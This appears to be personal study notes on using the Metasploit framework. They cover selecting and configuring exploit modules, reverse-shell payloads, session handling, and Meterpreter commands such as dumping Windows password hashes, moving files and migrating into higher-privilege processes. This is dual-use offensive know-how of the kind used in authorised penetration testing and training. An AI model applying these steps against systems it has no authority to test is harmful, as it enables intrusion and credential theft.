A tool to automatically exploit CVEs.
Has a CLI tool.
https://www.exploit-db.com/docs/english/44040-the-easiest-metasploit-guide-you%e2%80%99ll-ever-read.pdf
Open using `msfconsole`
## Selecting a module
```
use <module name>
```
can also search using
```
use <search term>
use <number that appeard in search>
```
## Using a module
Show required options using `show options`.
then set parameters like this:
```
set rhosts (remote address)
set rport (remote port)
(optional, if default ip might be wrong interface) set lhost (local ip)
(optional as it might assign by default) set payload path/to/payload
```
and other parameters if necessary.
Use `check` to just check if it's vulnerable.
Exploit by writing `exploit` or `run`
## Troubleshooting
- add `set VERBOSE true` for additional debug information
- Make sure `lhost` represents your IP address on the wanted interface (wifi / vpn)
- Try with a small payload (normal reverse shell instead of meterpreter)
## Managing sessions
- Moving to background - `Ctrl + Z`
- Listing active sessions - `sessions`
- Moving to foreground - `sessions -i <num>`
## Meterpreter shell
A shell with additional options
### Capabilities
- list commands - `help`
- normal shell - `shell`
- listing processes - `ps`
- (windows) dumping password hashes - `hashdump`
- Can use `ls, cd, cat, pwd` like normal, also in windows.
- `download <remote path> [<local path>]` - move file from remote to local
- `upload <local path> [<remote path>]` - move file from local to remote
### Upgrading
use `sessions -u <num>`
Can take a while, and will run in background (so being able to type isn't an indicator it finished).
If it doesn't work, can manually use the `post/multi/manage/shell_to_metarpreter` module.
Use `set session <session num>`
### Migrating process (windows)
Getting current pid - `getpid`
Can move to a higher-privileges process, or just stabilize if our current process can be closed.
Use `migrate <pid>`.
## Getting session from ssh connection
In case reverse shell won't work
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <Target_IP>
set USERNAME <username>
set PASSWORD <password>
run
```
Can then be upgraded like normal session using [[#Upgrading]]